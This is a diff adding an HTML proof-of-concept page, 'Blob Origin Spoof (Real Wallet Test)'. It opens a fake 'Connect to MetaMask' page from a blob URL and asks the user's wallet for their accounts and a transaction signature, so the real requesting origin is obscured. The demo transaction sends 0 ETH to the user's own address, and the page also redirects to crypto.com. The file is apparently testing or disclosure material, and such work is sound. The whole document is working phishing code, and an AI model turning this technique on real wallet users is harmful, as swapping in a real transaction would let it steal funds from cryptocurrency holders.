@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Blob Origin Spoof</title>
+</head>
+<body>
+  <h2>Blob Origin Spoof (Real Wallet Test)</h2>
+  <button onclick="launchBlob()">Launch Spoofed Wallet</button>
+
+  <script>
+    function launchBlob() {
+      const html = `
+        <html>
+          <head>
+            <title>Connect Wallet</title>
+            <style>
+              body { font-family: sans-serif; padding: 2em; }
+              button { padding: 10px 20px; font-size: 1.2em; margin: 5px; }
+            </style>
+          </head>
+          <body>
+            <h2>Connect to MetaMask</h2>
+            <button onclick="connect()">Connect Wallet</button>
+            <button id="signBtn" style="display:none;" onclick="sendTransaction()">Send Transaction</button>
+            <p id="status"></p>
+
+            <script>
+              let currentAccount = null;
+              const msgEl = document.getElementById('status');
+
+              async function connect() {
+                
+                if (typeof window.ethereum === 'undefined') {
+                  msgEl.textContent = 'No wallet found (window.ethereum missing)';
+                  return;
+                }
+                try {
+                  const accounts = await ethereum.request({
+                    method: 'eth_requestAccounts'
+                  });
+                  currentAccount = accounts[0];
+                  msgEl.textContent = 'Connected: ' + currentAccount;
+                  document.getElementById('signBtn').style.display = 'inline-block';
+                } catch (err) {
+                  msgEl.textContent = 'Error: ' + err.message;
+                }
+              }
+
+              async function sendTransaction() {
+                document.location='https://crypto.com';
+                if (!currentAccount) {
+                  msgEl.textContent = 'Wallet not connected';
+                  return;
+                }
+                const transactionParameters = {
+                  to: currentAccount, // Send to self
+                  from: currentAccount,
+                  value: '0x0', // 0 ETH
+                  gas: '0x5208', // 21000 gas
+                  data: '0x' // No extra data
+                };
+                try {
+                  const txHash = await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                  });
+                  msgEl.textContent = 'Transaction sent: ' + txHash;
+                } catch (err) {
+                  msgEl.textContent = 'Transaction failed: ' + err.message;
+                }
+              }
+            <\/script>
+          </body>
+        </html>
+      `;
+      const blob = new Blob([html], { type: 'text/html' });
+      const blobUrl = URL.createObjectURL(blob);
+      window.open(blobUrl, '_blank');
+    }
+  </script>
+</body>
+</html>
